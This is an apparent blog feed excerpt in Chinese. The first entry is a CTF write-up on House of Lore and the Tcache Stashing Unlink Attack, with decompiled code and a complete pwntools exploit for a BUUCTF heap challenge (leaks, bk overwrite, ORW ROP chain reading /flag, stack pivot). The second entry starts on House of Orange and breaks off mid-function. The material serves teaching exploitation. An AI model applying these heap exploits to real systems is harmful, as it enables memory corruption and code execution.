    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Lore</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Lore/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Lore/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:35.067Z</updated>
    
    <content type="html"><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p><p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p></blockquote><h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote><p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p></blockquote><p>利用前提</p><pre><code>1.能控制 Small Bin Chunk 的 bk 指针。2.程序可以越过Tache取Chunk。(使用calloc即可做到)3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</code></pre><h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p><pre><code>void __fastcall __noreturn main(char *a1, char **a2, char **a3){  char v3[268]; // [rsp+0h] [rbp-110h] BYREF  int v4; // [rsp+10Ch] [rbp-4h]  v4 = 0;  sub_11D5();  sub_1450();  sub_1269();  while ( 1 )  {    while ( 1 )    {      while ( 1 )      {        menu();        v4 = readd();        if ( v4 != 3 )          break;        a1 = v3;        edit(v3, a2);      }      if ( v4 &gt; 3 )        break;      if ( v4 == 1 )      {        if ( x1c &lt;= 0 )          exitt();        a1 = v3;        add(v3);        --x1c;      }      else      {        if ( v4 != 2 )          goto LABEL_19;        a1 = v3;        delete(v3);      }    }    if ( v4 == 5 )      exitt();    if ( v4 &lt; 5 )    {      a1 = v3;      show(v3);    }    else    {      if ( v4 != 666 )LABEL_19:        exitt();      stack_attack(a1, a2);    }  }}</code></pre><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p><pre><code>int __fastcall sub_1515(__int64 a1){  int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  unsigned int v4; // [rsp+18h] [rbp-18h]  int size; // [rsp+1Ch] [rbp-14h]  printf("Please input the red packet idx: ");  v4 = readd();  if ( v4 &gt; 0x10 )    exitt();  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");  v3 = readd();  if ( v3 == 2 )  {    size = 0xF0;  }  else if ( v3 &gt; 2 )  {    if ( v3 == 3 )    {      size = 0x300;    }    else    {      if ( v3 != 4 )        goto LABEL_14;      size = 0x400;    }  }  else  {    if ( v3 != 1 )    {LABEL_14:      size = 0;      goto LABEL_15;    }    size = 16;  }LABEL_15:  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )    exitt();  *(16LL * v4 + a1) = calloc(1uLL, size);  *(a1 + 16LL * v4 + 8) = size;  printf("Please input content: ");  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));  if ( v2 &lt;= 0 )    exitt();  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;  return puts("Done!");}</code></pre><h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p><pre><code>int __fastcall delete(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf("Please input the red packet idx: ");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  free(*(16LL * v2 + a1));                      // uaf                                                //   return puts("Done!");}</code></pre><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p><pre><code>int __fastcall sub_1740(__int64 a1, __int64 a2){  void *v2; // rsi  int v4; // [rsp+18h] [rbp-8h]  unsigned int v5; // [rsp+1Ch] [rbp-4h]  if ( qword_4010 &lt;= 0 )    exitt(a1, a2);  --qword_4010;  printf("Please input the red packet idx: ");  v5 = readd();  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )    exitt("Please input the red packet idx: ", a2);  printf("Please input content: ");  v2 = *(16LL * v5 + a1);  v4 = read(0, v2, *(16LL * v5 + a1 + 8));  if ( v4 &lt;= 0 )    exitt(0LL, v2);  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;  return puts("Done!");}</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int __fastcall sub_184E(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf("Please input the red packet idx: ");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  puts(*(16LL * v2 + a1));  return puts("Done!");}</code></pre><h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p><pre><code>ssize_t sub_13BD(){  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )    exitt();  puts("You get red packet!");  printf("What do you want to say?");  return read(0, buf, 0x90uLL);}</code></pre><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p><h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p><pre><code># coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF("./libc-2.29.so")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index))</code></pre><h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p><pre><code>#1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p><pre><code>show(15)last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote><p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p></blockquote><p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p><p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p><pre><code>add(1,4,'Chunk_1')add(13,3,'Chunk_13')dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p><pre><code>free(1)show(1)libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0lg('libc_base',libc_base)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p><pre><code>add(13,3,'Chunk_13')dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p><pre><code>add(13,3,'Chunk_13')dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p><pre><code>add(2,4,'Chunk_2')add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p><h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><pre><code>payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p><p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p><pre><code>pop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\x00\x00\x00'</code></pre><p>open(file_name_addr,0)</p><pre><code>ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])</code></pre><p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p><pre><code>ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])</code></pre><p>write(1,flag_addr,0x40)</p><pre><code>ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])</code></pre><p>申请chunk，将ROP链写到chunk里</p><pre><code>add(4,4,ROP_chain)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><pre><code>leave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))itr()</code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF("./libc-2.29.so")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index)) #1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)#dbg()show(15)last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)#dbg()add(1,4,'Chunk_1')add(13,3,'Chunk_13')#dbg()free(1)show(1)libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0lg('libc_base',libc_base)#dbg()#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100add(13,3,'Chunk_13')#dbg()#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunkadd(13,3,'Chunk_13')#dbg()#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunkadd(2,4,'Chunk_2')#申请一个chunk防止合并add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')#dbg()payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)#dbg()add(3,2,'Chunk_3')lg('heap_addr',heap_addr)#dbg()#ORWpop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\x00\x00\x00'#open(file_name_addr,0)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])#read(3,flag_addr,0x40)#Read函数的第一个参数文件描述符从0开始累加，#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，#这样在程序中，每打开一个文件，文件描述符值从3开始累加。#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件#read函数第一个参数是3，就是在这个文件里读取数据。ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])#write(1,flag_addr,0x40)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])add(4,4,ROP_chain)#dbg()leave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))#dbg()itr()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin&lt;/strong</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Orange</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Orange/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Orange/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:37.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.篡改top chunk size（注意size需要对齐内存页）2.分配比top chunk size大的chunk。3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。</code></pre><h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top chunk size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><pre><code>1.伪造的size必须要对齐到内存页。2.size要大于MINSIZE。3.size要小于之后申请的chunk size + MINISIZE。4.size的prev inuse位必须为1。5.malloc的大小不能大于mmap分配阈值。</code></pre><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre><code>void __fastcall __noreturn main(const char *a1, char **a2, char **a3){  int choice; // eax  sub_1218();  while ( 1 )  {    while ( 1 )    {      menu();      choice = my_read(a1, a2);      if ( choice != 2 )        break;      show();    }    if ( choice &gt; 2 )    {      if ( choice == 3 )      {        edit();      }      else      {        if ( choice == 4 )        {          puts("give up");          exit(0);        }LABEL_13:        a1 = "Invalid choice";        puts("Invalid choice");      }    }    else    {      if ( choice != 1 )        goto LABEL_13;      add();    }  }}</code></pre><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p><pre><code>int add(){  unsigned int size; // [rsp+8h] [rbp-18h]  int color; // [rsp+Ch] [rbp-14h]  _QWORD *v3; // [rsp+10h] [rbp-10h]  _DWORD *v4; // [rsp+18h] [rbp-8h]  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次  {    puts("Too many house");    exit(1);  }  v3 = malloc(0x10uLL);   //chunk_1  printf("Length of name :");  size = my_read();  if ( size &gt; 0x1000 )    size = 0x1000;  v3[1] = malloc(size);     //chunk_2  if ( !v3[1] )  {    puts("Malloc error !!!");    exit(1);  }  printf("Name :");  my_read2((void *)v3[1], size);  v4 = calloc(1uLL, 8uLL);      //chunk_3  printf("Price of Orange:");  *v4 = my_read();  ::color();  printf("Color of Orange:");  color = my_read();  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )  {    puts("No such color");    exit(1);  }  if ( color == 0xDDAA )    v4[1] = 0xDDAA;  else    v4[1] = color + 30;  *v3 = v4;  heap_array = v3;  ++num2;  return puts("Finish");}</code></pre><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int sub_EE6(){  int v0; // eax  int v2; // eax  if ( !heap_array )    return puts("No such house !");  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )  {    printf("Name of house : %s\n", (const char *)heap_array[1]);    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);    v0 = rand();    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&amp;unk_203080 + v0 % 8));  }  else  {    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )    {      puts("Color corruption!");      exit(1);    }    printf("Name of house : %s\n", (const char *)heap_array[1]);    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);    v2 = rand();    return printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));  }}</code></pre><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p><pre><code>int sub_107C(){  _DWORD *v1; // rbx  unsigned int size; // [rsp+8h] [rbp-18h]  int v3; // [rsp+Ch] [rbp-14h]  if ( num &gt; 2u )                               // num开始为0，可利用edit3次    return puts("You can't upgrade more");  if ( !heap_array )    return puts("No such house !");  printf("Length of name :");  size = my_read();  if ( size &gt; 0x1000 )    size = 4096;  printf("Name:");                              // size由我们输入，存在溢出  my_read2((void *)heap_array[1], size);  printf("Price of Orange: ");  v1 = (_DWORD *)*heap_array;  *v1 = my_read();  color();  printf("Color of Orange: ");  v3 = my_read();  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )  {    puts("No such color");    exit(1);  }  if ( v3 == 0xDDAA )    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;  else    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;  ++num;  